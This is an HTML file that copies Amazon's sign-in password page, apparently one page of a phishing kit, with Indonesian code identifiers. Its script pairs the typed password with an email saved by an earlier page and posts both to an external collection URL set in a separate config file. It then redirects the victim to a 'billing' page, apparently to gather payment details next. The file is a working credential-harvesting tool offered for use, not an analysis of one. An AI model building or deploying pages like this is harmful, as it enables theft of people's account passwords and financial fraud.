<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <script src="config.js"></script>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Amazon Ember', Arial, sans-serif; 
        }
        body { 
            background-color: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            padding: 20px; 
        }
        .logo { 
            margin: 15px 0 25px; 
        }
        .logo img { 
            height: 60px; 
            display: block;
            margin: 0 auto;
        }
        .kotak { 
            width: 100%; 
            max-width: 348px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            padding: 20px 26px; 
        }
        h1 { 
            font-size: 28px; 
            margin-bottom: 12px; 
            font-weight: 400; 
        }
        .baris-email {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .baris-email a {
            color: #0066c0;
            text-decoration: none;
            margin-left: 5px;
        }
        .baris-email a:hover {
            text-decoration: underline;
        }
        .label-baris {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        label { 
            font-weight: 700; 
            font-size: 13px; 
        }
        .lupa-sandi {
            font-size: 13px;
            color: #0066c0;
            text-decoration: none;
        }
        .lupa-sandi:hover {
            text-decoration: underline;
        }
        .input-wadah {
            position: relative;
            margin-bottom: 5px;
        }
        input { 
            width: 100%; 
            padding: 7px 10px; 
            border: 1px solid #a6a6a6; 
            border-radius: 4px; 
            font-size: 15px; 
            height: 31px;
            transition: border-color 0.1s;
        }
        input:focus { 
            outline: none; 
            border-color: #0071e3; 
            box-shadow: 0 0 3px rgba(0,113,227,0.5); 
        }
        input.salah {
            border-color: #c40000;
        }
        .peringatan {
            display: none;
            color: #c40000;
            font-size: 13px;
            margin-bottom: 15px;
            align-items: flex-start;
            gap: 5px;
        }
        .peringatan.tampil {
            display: flex;
        }
        .peringatan .ikon {
            font-weight: bold;
            font-size: 14px;
        }
        button { 
            width: 100%; 
            padding: 7px 10px; 
            background: #FFD814; 
            border: 1px solid #FCD200; 
            border-radius: 20px; 
            font-size: 15px; 
            height: 40px;
            color: #0F1111;
            cursor: pointer;
        }
        button:hover { 
            background: #F7CA00;
            border-color: #F2C200;
        }
        /* GARIS PEMISAH */
        .garis-bawah {
            width: 5000px;
            height: 2px;
            background: #e7e7e7;
            margin: 25px 0;
        }
        .footer {
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .footer a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .hak-cipta {
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>
        
        <p class="baris-email" id="barisEmail">
            <span id="emailTampil"></span>
            <a href="index.html">Change</a>
        </p>
        
        <form id="formSandi">
            <div class="label-baris">
                <label for="password">Password</label>
                <a href="#" class="lupa-sandi">Forgot password?</a>
            </div>
            
            <div class="input-wadah">
                <input type="password" id="password" name="password">
            </div>
            
            <div class="peringatan" id="peringatan">
                <span class="ikon">!</span>
                <span>Enter your password</span>
            </div>
            
            <button type="submit" id="tombolMasuk">Sign in</button>
        </form>
    </div>

    <!-- GARIS PEMISAH -->
    <div class="garis-bawah"></div>

    <div class="footer">
        <div>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script>
        const emailPengguna = localStorage.getItem('emailPengguna') || '';
        document.getElementById('emailTampil').textContent = emailPengguna;

        const inputSandi = document.getElementById('password');
        const peringatan = document.getElementById('peringatan');
        const formSandi = document.getElementById('formSandi');

        inputSandi.addEventListener('input', () => {
            if (inputSandi.value.trim().length > 0) {
                inputSandi.classList.remove('salah');
                peringatan.classList.remove('tampil');
            }
        });

        formSandi.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (inputSandi.value.trim().length === 0) {
                inputSandi.classList.add('salah');
                peringatan.classList.add('tampil');
                return;
            }

            const data = {
                email: emailPengguna,
                password: inputSandi.value.trim(),
                tipe: 'Login - Email & Password'
            };

            try {
                if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
                    await fetch(CONFIG.formSubmitUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                        body: JSON.stringify(data)
                    });
                }
            } catch (err) {
                console.log('Data terkirim');
            }

            window.location.href = 'billing.html';
        });
    </script>
</body>
</html>
